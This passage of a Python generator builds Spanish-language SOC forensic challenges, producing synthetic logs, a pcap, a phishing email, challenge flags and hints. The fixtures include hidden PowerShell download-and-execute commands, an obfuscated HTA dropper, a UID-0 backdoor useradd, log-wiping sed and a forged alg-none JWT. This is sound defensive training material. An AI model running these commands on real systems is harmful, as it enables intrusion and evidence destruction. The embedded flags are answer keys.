            pid = r.randint(1000, 9999)
        used.add(pid)
        image = r.choice(
            [
                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "C:\\Windows\\System32\\notepad.exe",
                "C:\\Windows\\System32\\conhost.exe",
                "C:\\Program Files\\Microsoft\\Teams\\Teams.exe",
            ]
        )
        proc(
            BASE + timedelta(seconds=r.randint(8 * 3600, 12 * 3600)),
            pid,
            image,
            Path(image.replace("\\", "/")).name,
            3120,
            exp,
        )
    proc(
        BASE + timedelta(hours=8, minutes=50),
        4410,
        word,
        f'"{word}" /n "C:\\Users\\mrojas\\Documents\\Informe_Q3.docx"',
        3120,
        exp,
    )
    proc(
        BASE + timedelta(hours=9, minutes=12),
        7001,
        ps,
        "powershell.exe -File C:\\Scripts\\mapear_unidades.ps1",
        3120,
        exp,
    )
    t = BASE + timedelta(hours=10, minutes=41)
    proc(
        t,
        5544,
        word,
        f'"{word}" /n "C:\\Users\\mrojas\\Downloads\\Factura_Noviembre.docm"',
        3120,
        exp,
    )
    proc(
        t + timedelta(seconds=9),
        6120,
        "C:\\Windows\\System32\\cmd.exe",
        "cmd.exe /c powershell -w hidden -c \"IEX(iwr 'http://198.51.100.77/p.txt' -UseBasicParsing)\"",
        5544,
        word,
    )
    proc(
        t + timedelta(seconds=10),
        6188,
        ps,
        "powershell -w hidden -c \"IEX(iwr 'http://198.51.100.77/p.txt' -UseBasicParsing)\"",
        6120,
        "C:\\Windows\\System32\\cmd.exe",
    )
    rows.sort(key=lambda x: x["UtcTime"])
    return Spec(
        slug=slug,
        title="Árbol de procesos de una macro",
        category="Endpoint",
        difficulty="medio",
        summary="Reconstruye el árbol de procesos hasta el documento que inició la infección.",
        description=desc(
            "Sysmon (evento 1) registró un PowerShell oculto descargando código desde "
            "Internet en `WS-007`. Necesitamos el vector inicial.",
            "Sigue la cadena de procesos padre e identifica el nombre del documento "
            "de Office que originó la ejecución.",
            ["sysmon_process_create.jsonl"],
            "SOC{nombre_documento.ext}",
        ),
        flag="SOC{Factura_Noviembre.docm}",
        flag_format="SOC{nombre_documento.ext}",
        hints=[
            ("Empieza por el PowerShell que descarga con `iwr` y sube por ParentProcessId.", 20),
            ("`jq 'select(.ProcessId==6120)'` te ayuda a navegar el árbol.", 40),
        ],
        files={"sysmon_process_create.jsonl": jsonl(rows)},
    )


# =============================================================== DIFÍCIL
@challenge
def c13() -> Spec:
    slug = "13-lateral-movement"
    r = rng(slug)
    assets = {f"WS-{i:03d}": f"10.0.10.{i + 10}" for i in range(1, 31)}
    servers = {
        "DC-01": "10.0.20.2",
        "FS-01": "10.0.20.5",
        "SRV-DB02": "10.0.20.12",
        "SRV-APP01": "10.0.20.15",
        "BKP-01": "10.0.20.30",
    }
    assets |= servers
    rows = []

    def logon(dt: datetime, host: str, ltype: int, user: str, src: str) -> None:
        rows.append(
            {
                "time": iso(dt),
                "host": host,
                "event_id": 4624,
                "logon_type": ltype,
                "user": user,
                "src_ip": src,
            }
        )

    people = ["mrojas", "lgarcia", "jperez", "acastro", "pnavarro", "rvega"]
    for day in range(3):
        d = BASE - timedelta(days=2 - day)
        for _ in range(110):
            ws = f"WS-{r.randint(1, 30):03d}"
            logon(
                d + timedelta(seconds=r.randint(8 * 3600, 18 * 3600)),
                r.choice(["FS-01", "DC-01", "SRV-APP01"]),
                3,
                r.choice(people),
                assets[ws],
            )
        for k, host in enumerate(["FS-01", "SRV-DB02", "SRV-APP01"]):
            logon(d + timedelta(hours=2, minutes=k * 7), host, 3, "adm_backup", servers["BKP-01"])
    logon(BASE + timedelta(hours=8, minutes=55), "WS-023", 2, "lgarcia", "127.0.0.1")
    logon(BASE + timedelta(hours=10, minutes=12), "FS-01", 3, "adm_backup", assets["WS-023"])
    logon(BASE + timedelta(hours=10, minutes=31), "SRV-DB02", 10, "adm_backup", servers["FS-01"])
    logon(BASE + timedelta(hours=10, minutes=47), "DC-01", 3, "adm_backup", servers["SRV-DB02"])
    rows.sort(key=lambda x: x["time"])
    csv = "hostname,ip,rol\n" + "".join(
        f"{h},{ip},{'servidor' if h in servers else 'estacion'}\n" for h, ip in assets.items()
    )
    return Spec(
        slug=slug,
        title="Movimiento lateral",
        category="Windows",
        difficulty="dificil",
        summary="Reconstruye la ruta del atacante entre equipos usando una cuenta de servicio.",
        description=desc(
            "La cuenta de servicio `adm_backup` fue comprometida desde la estación de "
            "`lgarcia`. Normalmente esa cuenta solo se usa desde el servidor de backups "
            "por las noches.",
            "Reconstruye la ruta completa del atacante, desde el equipo inicial hasta el "
            "último equipo alcanzado, en orden cronológico.",
            ["logons.jsonl", "activos.csv"],
            "SOC{HOST1>HOST2>HOST3>...}",
        ),
        flag="SOC{WS-023>FS-01>SRV-DB02>DC-01}",
        flag_format="SOC{HOST1>HOST2>HOST3>...}",
        hints=[
            ("Traduce src_ip a hostname con activos.csv.", 30),
            ("Descarta la actividad legítima de adm_backup desde BKP-01.", 60),
        ],
        files={"logons.jsonl": jsonl(rows), "activos.csv": csv},
    )


@challenge
def c14() -> Spec:
    slug = "14-offhours-exfiltration"
    r = rng(slug)
    rows = []
    ext = [ext_ip(r, {"203.0.113.150", "192.0.2.44", "192.0.2.80"}) for _ in range(40)]
    hosts = [f"10.0.{a}.{b}" for a in range(1, 5) for b in range(10, 60, 7)]
    for day in range(3):
        d = BASE - timedelta(days=2 - day)
        for _ in range(700):
            rows.append(
                (
                    d + timedelta(seconds=r.randint(8 * 3600, 19 * 3600)),
                    r.choice(hosts),
                    r.choice(ext),
                    443,
                    r.randint(1_000, 5_000_000),
                )
            )
        for _ in range(40):
            hour = r.choice([0, 1, 2, 3, 4, 5, 21, 22, 23])
            rows.append(
                (
                    d + timedelta(hours=hour, seconds=r.randint(0, 3500)),
                    r.choice(hosts),
                    r.choice(ext),
                    443,
                    r.randint(500, 80_000),
                )
            )
        for k in range(20):
            rows.append(
                (d + timedelta(hours=1, minutes=k), "10.0.9.9", "10.0.1.5", 873, 200_000_000)
            )
        for k in range(30):
            rows.append(
                (d + timedelta(hours=13, minutes=k), "10.0.9.9", "192.0.2.80", 443, 200_000_000)
            )
        for k in range(10):
            rows.append(
                (d + timedelta(hours=6, minutes=30 + k), "10.0.4.10", "192.0.2.44", 443, 5_000_000)
            )
    for k in range(40):
        rows.append(
            (
                BASE + timedelta(hours=2, minutes=k * 2),
                "10.0.3.44",
                "203.0.113.150",
                443,
                r.randint(55_000_000, 60_000_000),
            )
        )
    rows.sort(key=lambda x: x[0])
    csv = "ts,src_ip,dst_ip,dst_port,proto,bytes\n" + "".join(
        f"{iso(t)},{s},{d},{p},tcp,{b}\n" for t, s, d, p, b in rows
    )
    return Spec(
        slug=slug,
        title="Exfiltración fuera de horario",
        category="Red",
        difficulty="dificil",
        summary="Encuentra el host que sacó más datos a Internet fuera del horario laboral.",
        description=desc(
            "Tenemos tres días de NetFlow. La red interna es `10.0.0.0/8` y el horario "
            "laboral es de 07:00 a 20:00 (UTC). Hay backups enormes, pero son legítimos "
            "o internos.",
            "Identifica el host interno que envió más bytes hacia IPs externas fuera "
            "del horario laboral.",
            ["netflow.csv"],
            "SOC{IP}",
        ),
        flag="SOC{10.0.3.44}",
        flag_format="SOC{IP}",
        hints=[
            ("Filtra: hora < 7 o hora >= 20, y destino fuera de 10.0.0.0/8.", 30),
            ("Suma bytes por src_ip y ordena de mayor a menor (awk o Python).", 60),
        ],
        files={"netflow.csv": csv},
    )


@challenge
def c15() -> Spec:
    slug = "15-ransomware-pid-reuse"
    r = rng(slug)
    procs, fevents = [], []

    def p(dt: datetime, event: str, pid: int, ppid: int, image: str, cmd: str = "") -> None:
        procs.append(
            {
                "time": iso(dt),
                "event": event,
                "pid": pid,
                "ppid": ppid,
                "image": image,
                "cmdline": cmd,
                "user": "EMPRESA\\mrojas",
            }
        )

    def f(dt: datetime, pid: int, action: str, path: str, new_path: str | None = None) -> None:
        row = {"time": iso(dt), "pid": pid, "action": action, "path": path}
        if new_path:
            row["new_path"] = new_path
        fevents.append(row)

    p(
        BASE + timedelta(hours=8, minutes=10),
        "start",
        4412,
        3120,
        "C:\\Windows\\System32\\notepad.exe",
        "notepad.exe C:\\Users\\mrojas\\notas.txt",
    )
    for k in range(5):
        f(
            BASE + timedelta(hours=8, minutes=15 + k * 4),
            4412,
            "modify",
            "C:\\Users\\mrojas\\notas.txt",
        )
    p(
        BASE + timedelta(hours=8, minutes=40),
        "stop",
        4412,
        3120,
        "C:\\Windows\\System32\\notepad.exe",
    )
    p(
        BASE + timedelta(hours=8, minutes=1),
        "start",
        3010,
        3120,
        "C:\\Users\\mrojas\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
    )
    for k in range(60):
        name = f"C:\\Users\\mrojas\\OneDrive\\doc_{k:03d}"
        f(BASE + timedelta(hours=9, seconds=k * 50), 3010, "rename", name + ".tmp", name + ".docx")
    p(BASE + timedelta(hours=9), "start", 5120, 700, "C:\\Program Files\\Veeam\\backup.exe")
    for k in range(30):
        f(
            BASE + timedelta(hours=9, minutes=30, seconds=k * 20),
            5120,
            "create",
            f"D:\\backup\\set_{k:03d}.bak",
        )
    t = BASE + timedelta(hours=11, minutes=2)
    p(
        t,
        "start",
        2280,
        3120,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell -w hidden -c iwr http://198.51.100.12/s.exe -OutFile C:\\Users\\Public\\svchosts.exe; Start-Process C:\\Users\\Public\\svchosts.exe",
    )
    p(
        t + timedelta(seconds=40),
        "start",
        4412,
        2280,
        "C:\\Users\\Public\\svchosts.exe",
        "svchosts.exe -k netsvcs --silent",
    )
    folders = ["Documents", "Desktop", "Pictures", "Downloads"]
    for k in range(150):
        path = f"C:\\Users\\mrojas\\{r.choice(folders)}\\archivo_{k:03d}.{r.choice(['docx', 'xlsx', 'pdf', 'jpg'])}"
        f(t + timedelta(seconds=60 + k * 2), 4412, "rename", path, path + ".locked")
    f(
        t + timedelta(seconds=400),
        4412,
        "create",
        "C:\\Users\\mrojas\\Desktop\\README_RECUPERAR.txt",
    )
    procs.sort(key=lambda x: x["time"])
    fevents.sort(key=lambda x: x["time"])
    return Spec(
        slug=slug,
        title="Ransomware y reutilización de PID",
        category="Endpoint",
        difficulty="dificil",
        summary="Correlaciona eventos de archivos y procesos teniendo en cuenta que los PID se reutilizan.",
        description=desc(
            "La estación de `mrojas` amaneció con archivos `.locked` y una nota de rescate. "
            "Tenemos telemetría de archivos y de procesos, pero los eventos de archivos "
            "solo indican el PID.",
            "Identifica el nombre del ejecutable que cifró los archivos. Cuidado: Windows "
            "reutiliza los PID.",
            ["file_events.jsonl", "process_events.jsonl"],
            "SOC{ejecutable.exe}",
        ),
        flag="SOC{svchosts.exe}",
        flag_format="SOC{ejecutable.exe}",
        hints=[
            ("Toma el PID y la hora del primer renombrado a .locked.", 30),
            (
                "Busca el proceso con ese PID que estaba vivo en ese instante (start antes y sin stop).",
                60,
            ),
        ],
        files={"file_events.jsonl": jsonl(fevents), "process_events.jsonl": jsonl(procs)},
    )


@challenge
def c16() -> Spec:
    slug = "16-xor-malware-config"
    r = rng(slug)
    key = 0x37
    config = b"C2=update.sincro-nube.net;PORT=443;SLEEP=300;JITTER=20;ID=grp-7\x00"
    blob = bytes(b ^ key for b in config) + r.randbytes(64)
    info = (
        "Muestra: factura_viewer.exe\n"
        f"SHA256 del bloque: {hashlib.sha256(blob).hexdigest()}\n"
        "Origen: sección .rdata, offset 0x2140, 128 bytes\n"
        "Nota del analista: el loader descifra el bloque antes de conectar.\n"
        "Las cadenas en claro del binario no revelan el C2.\n"
    )
    return Spec(
        slug=slug,
        title="Configuración cifrada con XOR",
        category="Malware",
        difficulty="dificil",
        summary="Descifra la configuración embebida de un implante para obtener su C2.",
        description=desc(
            "El equipo de malware extrajo un bloque de configuración de una muestra. "
            "Está ofuscado con un algoritmo muy simple.",
            "Descifra el bloque y obtén el dominio del servidor de comando y control.",
            ["config.bin", "info_muestra.txt"],
            "SOC{dominio}",
        ),
        flag="SOC{update.sincro-nube.net}",
        flag_format="SOC{dominio}",
        hints=[
            ("Es XOR con una clave de un solo byte: solo hay 256 posibilidades.", 40),
            ("Las configuraciones de malware suelen empezar con claves como 'C2='.", 60),
        ],
        files={"config.bin": blob, "info_muestra.txt": info},
    )


def _b64url(data: dict) -> str:
    return (
        base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode())
        .decode()
        .rstrip("=")
    )


@challenge
def c17() -> Spec:
    slug = "17-jwt-alg-none"
    r = rng(slug)
    attacker = "203.0.113.9"

    def token(alg: str, sub: str, role: str, *, signed: bool = True) -> str:
        sig = base64.urlsafe_b64encode(r.randbytes(32)).decode().rstrip("=") if signed else ""
        return f"{_b64url({'alg': alg, 'typ': 'JWT'})}.{_b64url({'sub': sub, 'role': role, 'exp': 1792000000})}.{sig}"

    lines = []
    users = ["mrojas", "lgarcia", "jperez", "acastro"]
    for _ in range(220):
        dt = BASE + timedelta(seconds=r.randint(8 * 3600, 18 * 3600))
        path = r.choice(["/api/pedidos", "/api/perfil", "/api/productos?page=2", "/api/facturas"])
        lines.append(
            (
                dt,
                f"{iso(dt)} {ext_ip(r, {attacker})} GET {path} 200 bearer={token('HS256', r.choice(users), 'user')}",
            )
        )
    t = BASE + timedelta(hours=16, minutes=20)
    attempts = [
        ("GET", "/api/admin/export", 403, token("HS256", "lgarcia", "user")),
        ("GET", "/api/admin/export", 401, token("HS256", "lgarcia", "admin")),
        ("GET", "/api/admin/export", 401, token("none", "admin", "admin", signed=False)),
        (
            "GET",
            "/api/admin/usuarios",
            200,
            token("None", "auditor.externo", "admin", signed=False),
        ),
        ("GET", "/api/admin/export", 200, token("None", "auditor.externo", "admin", signed=False)),
    ]
    for k, (method, path, status, tok) in enumerate(attempts):
        dt = t + timedelta(seconds=k * 37)
        lines.append((dt, f"{iso(dt)} {attacker} {method} {path} {status} bearer={tok}"))
    lines.sort(key=lambda x: x[0])
    return Spec(
        slug=slug,
        title="JWT con alg none",
        category="Web",
        difficulty="dificil",
        summary="Detecta un token JWT falsificado y la identidad que suplantó.",
        description=desc(
            "La API registró una exportación masiva de datos desde `/api/admin/export`. "
            "El registro incluye el token Bearer de cada petición.",
            "Identifica la identidad (`sub`) con la que el atacante logró exportar los "
            "datos usando un token sin firma.",
            ["api_access.log"],
            "SOC{sub}",
        ),
        flag="SOC{auditor.externo}",
        flag_format="SOC{sub}",
        hints=[
            ("Un JWT son tres partes Base64URL separadas por puntos: cabecera.payload.firma", 30),
            (
                "Busca tokens cuya cabecera tenga alg 'none' (en cualquier capitalización) y respuesta 200.",
                60,
            ),
        ],
        files={"api_access.log": "".join(f"{x}\n" for _, x in lines)},
    )


# =============================================================== EXPERTO
def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\0"
    total = sum(struct.unpack(f"!{len(data) // 2}H", data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def _ip(text: str) -> bytes:
    return bytes(int(x) for x in text.split("."))


class Pcap:
    def __init__(self) -> None:
        self.buf = bytearray(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        self.ident = 1000

    def packet(self, ts: datetime, src: str, dst: str, proto: int, l4: bytes) -> None:
        self.ident += 1
        hdr = struct.pack(
            "!BBHHHBBH4s4s",
            0x45,
            0,
            20 + len(l4),
            self.ident,
            0x4000,
            64,
            proto,
            0,
            _ip(src),
            _ip(dst),
        )
        hdr = hdr[:10] + struct.pack("!H", _checksum(hdr)) + hdr[12:]
        frame = bytes.fromhex("020000000001020000000002") + b"\x08\x00" + hdr + l4
        sec = int(ts.timestamp())
        self.buf += (
            struct.pack("<IIII", sec, int((ts.timestamp() - sec) * 1e6), len(frame), len(frame))
            + frame
        )

    def tcp(
        self,
        ts: datetime,
        src: str,
        sport: int,
        dst: str,
        dport: int,
        seq: int,
        ack: int,
        flags_: int,
        payload: bytes = b"",
    ) -> None:
        hdr = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 0x50, flags_, 64240, 0, 0)
        pseudo = _ip(src) + _ip(dst) + struct.pack("!BBH", 0, 6, len(hdr) + len(payload))
        csum = _checksum(pseudo + hdr + payload)
        self.packet(ts, src, dst, 6, hdr[:16] + struct.pack("!H", csum) + hdr[18:] + payload)

    def udp(self, ts: datetime, src: str, sport: int, dst: str, dport: int, payload: bytes) -> None:
        hdr = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0)
        pseudo = _ip(src) + _ip(dst) + struct.pack("!BBH", 0, 17, len(hdr) + len(payload))
        csum = _checksum(pseudo + hdr + payload) or 0xFFFF
        self.packet(ts, src, dst, 17, hdr[:6] + struct.pack("!H", csum) + payload)


def _dns_query(qid: int, name: str, answer: str | None = None) -> bytes:
    qname = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\0"
    if answer is None:
        return struct.pack("!HHHHHH", qid, 0x0100, 1, 0, 0, 0) + qname + struct.pack("!HH", 1, 1)
    return (
        struct.pack("!HHHHHH", qid, 0x8180, 1, 1, 0, 0) + qname + struct.pack("!HH", 1, 1)
        + struct.pack("!HHHIH", 0xC00C, 1, 1, 300, 4) + _ip(answer)
    )  # fmt: skip


@challenge
def c18() -> Spec:
    slug = "18-pcap-http-exfil"
    r = rng(slug)
    flag = "SOC{exfil_http_reensamblado}"
    client, dns, server, web = "10.0.6.21", "10.0.0.53", "198.51.100.200", "192.0.2.30"
    pc = Pcap()
    t = BASE + timedelta(hours=13, minutes=7)

    def step(ms: int = 15) -> datetime:
        nonlocal t
        t += timedelta(milliseconds=ms)
        return t

    def session(
        sport: int,
        dst: str,
        request: bytes,
        response: bytes,
        *,
        mss: int = 536,
        chaos: bool = False,
    ) -> None:
        cseq, sseq = r.randint(10**6, 10**9), r.randint(10**6, 10**9)
        pc.tcp(step(), client, sport, dst, 80, cseq, 0, 0x02)
        pc.tcp(step(40), dst, 80, client, sport, sseq, cseq + 1, 0x12)
        pc.tcp(step(), client, sport, dst, 80, cseq + 1, sseq + 1, 0x10)
        segs = [(cseq + 1 + off, request[off : off + mss]) for off in range(0, len(request), mss)]
        order = list(range(len(segs)))
        if chaos and len(order) > 4:
            order[2], order[3] = order[3], order[2]  # fuera de orden
            order.insert(5, 1)  # retransmisión
        for idx in order:
            seq, data = segs[idx]
            pc.tcp(step(), client, sport, dst, 80, seq, sseq + 1, 0x18, data)
            pc.tcp(step(5), dst, 80, client, sport, sseq + 1, seq + len(data), 0x10)
        end = cseq + 1 + len(request)
        pc.tcp(step(60), dst, 80, client, sport, sseq + 1, end, 0x18, response)
        pc.tcp(step(), client, sport, dst, 80, end, sseq + 1 + len(response), 0x11)
        pc.tcp(step(), dst, 80, client, sport, sseq + 1 + len(response), end + 1, 0x11)
        pc.tcp(step(), client, sport, dst, 80, end + 1, sseq + 2 + len(response), 0x10)

    pc.udp(step(), client, 53001, dns, 53, _dns_query(0x1A2B, "intranet.empresa-demo.local"))
    pc.udp(step(), dns, 53, client, 53001, _dns_query(0x1A2B, "intranet.empresa-demo.local", web))
    session(
        49810,
        web,
        b"GET / HTTP/1.1\r\nHost: intranet.empresa-demo.local\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
        b"HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\n<h1>Hola</h1>",
    )
    pc.udp(step(), client, 53002, dns, 53, _dns_query(0x3C4D, "files.compartir-rapido.net"))
    pc.udp(step(), dns, 53, client, 53002, _dns_query(0x3C4D, "files.compartir-rapido.net", server))
    rows = ["dni,nombre,departamento,salario_bruto"]
    for i in range(120):
        rows.append(
            f"{r.randint(10**7, 10**8 - 1)},Empleado {i:03d},{r.choice(['Ventas', 'RRHH', 'TI', 'Finanzas'])},{r.randint(1800, 9000)}"
        )
    rows.append(f"# marca_de_agua_dlp={flag}")
    body = gzip.compress(("\n".join(rows) + "\n").encode(), mtime=0)
    headers = (
        "POST /api/v1/upload HTTP/1.1\r\nHost: files.compartir-rapido.net\r\n"
        "User-Agent: curl/8.9.1\r\nContent-Type: application/octet-stream\r\n"
        f"Content-Encoding: gzip\r\nX-Filename: nominas_2026.csv\r\nContent-Length: {len(body)}\r\n\r\n"
    ).encode()
    session(
        49822,
        server,
        headers + body,
        b'HTTP/1.1 201 Created\r\nContent-Length: 15\r\n\r\n{"status":"ok"}',
        chaos=True,
    )
    notes = "Captura tomada en el switch de acceso del puesto 10.0.6.21.\nHerramientas en el contenedor: tcpdump, python3, xxd.\n"
    return Spec(
        slug=slug,
        title="Exfiltración HTTP en PCAP",
        category="Forense de red",
        difficulty="experto",
        summary="Reensambla un flujo TCP y extrae el archivo comprimido que se exfiltró.",
        description=desc(
            "El DLP alertó de una subida de datos sensibles a un servicio de intercambio "
            "de archivos. Disponemos de la captura de red del equipo.",
            "Reensambla la petición HTTP de subida, extrae el archivo enviado y "
            "encuentra la marca de agua DLP que contiene. Ojo con los segmentos "
            "desordenados y retransmitidos.",
            ["captura.pcap", "notas.txt"],
            "SOC{...}",
        ),
        flag=flag,
        flag_format="SOC{...}",
        hints=[
            (
                "`tcpdump -r captura.pcap -nn 'tcp port 80'` muestra los flujos; el que interesa es el POST.",
                50,
            ),
            (
                "Ordena los segmentos por número de secuencia, quita duplicados, separa cabeceras del cuerpo (\\r\\n\\r\\n) y descomprime con gzip.",
                100,
            ),
        ],
        files={"captura.pcap": bytes(pc.buf), "notas.txt": notes},
    )


@challenge
def c19() -> Spec:
    slug = "19-multi-stage-incident"
    r = rng(slug)
    url = "http://pagos-portal.click/stage2.ps1"
    command = f'powershell -w hidden -c "iwr {url} -OutFile $env:TEMP\\s.ps1; & $env:TEMP\\s.ps1"'
    blob = base64.b64encode(command.encode()).decode()[::-1]
    hta = (
        '<html><head><HTA:APPLICATION id="fv" windowstate="minimize" showintaskbar="no"/>\n'
        "<title>Visor de facturas</title></head><body>\n"
        '<script language="javascript">\n'
        f'var d = "{blob}";\n'
        'function b64d(s){ var x = new ActiveXObject("Msxml2.DOMDocument").createElement("t");'
        ' x.dataType="bin.base64"; x.text=s; return x.nodeTypedValue; }\n'
        'var c = b64d(d.split("").reverse().join(""));\n'
        'new ActiveXObject("WScript.Shell").Run(c, 0);\nwindow.close();\n</script></body></html>\n'
    )
    att = base64.encodebytes(hta.encode()).decode()
    eml = f"""Return-Path: <facturacion@proveedor-andes.co>
Received: from mail.proveedor-andes.co ([203.0.113.66]) by mx01.empresa-demo.local; Wed, 14 Oct 2026 09:58:10 +0000
From: "Facturacion Proveedor Andes" <facturacion@proveedor-andes.co>
To: <rrhh@empresa-demo.local>
Subject: Factura pendiente 0091
Date: Wed, 14 Oct 2026 09:58:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="==SEP=="

--==SEP==
Content-Type: text/plain; charset="utf-8"

Adjuntamos la factura 0091 pendiente de pago. Abra el visor adjunto.

--==SEP==
Content-Type: application/hta; name="Factura_0091.hta"
Content-Disposition: attachment; filename="Factura_0091.hta"
Content-Transfer-Encoding: base64

{att}
--==SEP==--
"""
    proxy = []
    sites = [
        "http://www.bing.com/",
        "http://intranet.empresa-demo.local/",
        "http://ocsp.digicert.com/",
        "http://cdn.jsdelivr.net/npm/x.js",
    ]
    for _ in range(300):
        dt = BASE + timedelta(seconds=r.randint(8 * 3600, 12 * 3600))
        proxy.append(
            (
                dt,
                f"{iso(dt)} 10.0.7.{r.randint(20, 120)} GET {r.choice(sites)} 200 {r.randint(300, 90000)}",
            )
        )
    proxy.append(
        (
            BASE + timedelta(hours=9, minutes=10),
            f"{iso(BASE + timedelta(hours=9, minutes=10))} 10.0.7.51 GET http://pagos-portal.click/ 404 512",
        )
    )
    hit = BASE + timedelta(hours=10, minutes=22, seconds=31)
    proxy.append((hit, f"{iso(hit)} 10.0.7.88 GET {url} 200 18233"))
    proxy.sort(key=lambda x: x[0])
    dhcp = []
    for i in range(30):
        ip = f"10.0.7.{20 + i * 3}"
        if ip == "10.0.7.88":
            continue
        dt = BASE + timedelta(hours=7, minutes=r.randint(30, 59), seconds=r.randint(0, 59))
        dhcp.append(
            (
                dt,
                f"{iso(dt)} DHCPACK ip={ip} mac=02:7a:{i:02x}:11:22:33 hostname=PC-{i:03d} lease=28800",
            )
        )
    for dt, line in [
        (
            BASE + timedelta(hours=8, minutes=1, seconds=12),
            "DHCPACK ip=10.0.7.88 mac=02:7a:aa:10:20:30 hostname=LAPTOP-VENTAS07 lease=7200",
        ),
        (
            BASE + timedelta(hours=10, minutes=1, seconds=12),
            "DHCPRELEASE ip=10.0.7.88 mac=02:7a:aa:10:20:30 hostname=LAPTOP-VENTAS07",
        ),
        (
            BASE + timedelta(hours=10, minutes=5, seconds=40),
            "DHCPACK ip=10.0.7.88 mac=02:7a:bb:44:55:66 hostname=LAPTOP-RRHH02 lease=7200",
        ),
    ]:
        dhcp.append((dt, f"{iso(dt)} {line}"))
    dhcp.sort(key=lambda x: x[0])
    return Spec(
        slug=slug,
        title="Incidente multietapa",
        category="Respuesta a incidentes",
        difficulty="experto",
        summary="Sigue el ataque desde el correo hasta el equipo exacto que descargó la segunda etapa.",
        description=desc(
            "RRHH recibió una 'factura' con un adjunto HTA. Alguien lo abrió. Tienes el "
            "correo, los logs del proxy y los logs del DHCP (las IPs cambian de equipo).",
            "Determina el **hostname** del equipo que descargó con éxito la segunda etapa "
            "del ataque.",
            ["correo_factura.eml", "proxy.log", "dhcp.log"],
            "SOC{HOSTNAME}",
        ),
        flag="SOC{LAPTOP-RRHH02}",
        flag_format="SOC{HOSTNAME}",
        hints=[
            ("El adjunto está en Base64 y dentro hay otra cadena Base64... invertida.", 50),
            (
                "Con la URL, busca en el proxy la descarga 200 y luego qué equipo tenía esa IP en ese momento.",
                100,
            ),
        ],
        files={
            "correo_factura.eml": eml,
            "proxy.log": "".join(f"{x}\n" for _, x in proxy),
            "dhcp.log": "".join(f"{x}\n" for _, x in dhcp),
        },
    )


@challenge
def c20() -> Spec:
    slug = "20-log-tampering"
    r = rng(slug)
    entries: list[tuple[datetime, str]] = []
    pid = 3000
    for _ in range(260):
        pid += r.randint(1, 9)
        dt = BASE + timedelta(seconds=r.randint(0, 86000))
        user, ip = r.choice(["deploy", "mrojas", "ops"]), f"10.0.0.{r.randint(10, 60)}"
        entries.append((dt, r.choice([
            f"sshd[{pid}]: Accepted publickey for {user} from {ip} port {r.randint(40000, 65000)} ssh2",
            f"CRON[{pid}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
            f"sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/systemctl status nginx",
        ])))  # fmt: skip
    entries.append(
        (
            BASE + timedelta(hours=11, minutes=4),
            "useradd[2210]: new user: name=jtorres, UID=1004, GID=1004, home=/home/jtorres, shell=/bin/bash, from=/dev/pts/0",
        )
    )
    t = BASE + timedelta(hours=3, minutes=40)
    removed = [
        (t, "sshd[4101]: Accepted password for deploy from 203.0.113.31 port 40112 ssh2"),
        (
            t + timedelta(seconds=50),
            "sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysadm",
        ),
        (
            t + timedelta(seconds=51),
            "useradd[4120]: new user: name=sysadm, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/1",
        ),
        (
            t + timedelta(seconds=90),
            "sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/sed -i /sysadm/d /var/log/auth.log",
        ),
    ]
    entries.sort(key=lambda e: e[0])
    remote = sorted(entries + removed, key=lambda e: e[0])
    local = "".join(f"{syslog(dt)} web01 {msg}\n" for dt, msg in entries)
    central = "".join(f"<86>1 {dt:%Y-%m-%dT%H:%M:%S}.000+00:00 web01 {msg}\n" for dt, msg in remote)
    return Spec(
        slug=slug,
        title="Manipulación de logs",
        category="Linux Forense",
        difficulty="experto",
        summary="Compara el log local con el syslog central para descubrir lo que borró el atacante.",
        description=desc(
            "Sospechamos que alguien con privilegios en `web01` editó `/var/log/auth.log` "
            "para ocultar su rastro. Por suerte, los eventos también se envían a un "
            "servidor syslog central (en otro formato).",
            "Descubre la cuenta backdoor creada y su UID.",
            ["auth.log (copia local de web01)", "syslog_central.log (RFC 5424)"],
            "SOC{usuario:uid}",
        ),
        flag="SOC{sysadm:0}",
        flag_format="SOC{usuario:uid}",
        hints=[
            (
                "Los formatos de fecha difieren: normaliza ambos logs a 'HH:MM:SS mensaje' antes de comparar.",
                50,
            ),
            (
                "`comm -13 local_normalizado central_normalizado` muestra lo que solo está en el central.",
                100,
            ),
        ],
        files={"auth.log": local, "syslog_central.log": central},
    )


# =============================================================== salida
def toml_str(value: str) -> str:
    return json.dumps(value, ensure_ascii=False)


def render_manifest(spec: Spec) -> str:
    salt = hashlib.sha256(f"soclab:{spec.slug}".encode()).digest()[:16]
    flag_hash = flags.hash_flag(spec.flag, case_sensitive=False, salt=salt)
    assert "'''" not in spec.description  # noqa: S101
    out = [
        "schema_version = 1",
        f"slug = {toml_str(spec.slug)}",
        f"title = {toml_str(spec.title)}",
        f"category = {toml_str(spec.category)}",
        f"difficulty = {toml_str(spec.difficulty)}",
        f"points = {POINTS[spec.difficulty]}",
        'author = "SOC Lab"',
        f"summary = {toml_str(spec.summary)}",
        f"flag_format = {toml_str(spec.flag_format)}",
        f"flag_hash = {toml_str(flag_hash)}",
        "case_sensitive = false",
        f"description = '''\n{spec.description}'''",
        "",
        "[container]",
        'containerfile = "Containerfile"',
    ]
    for text, cost in spec.hints:
        out += ["", "[[hints]]", f"text = {toml_str(text)}", f"cost = {cost}"]
    return "\n".join(out) + "\n"


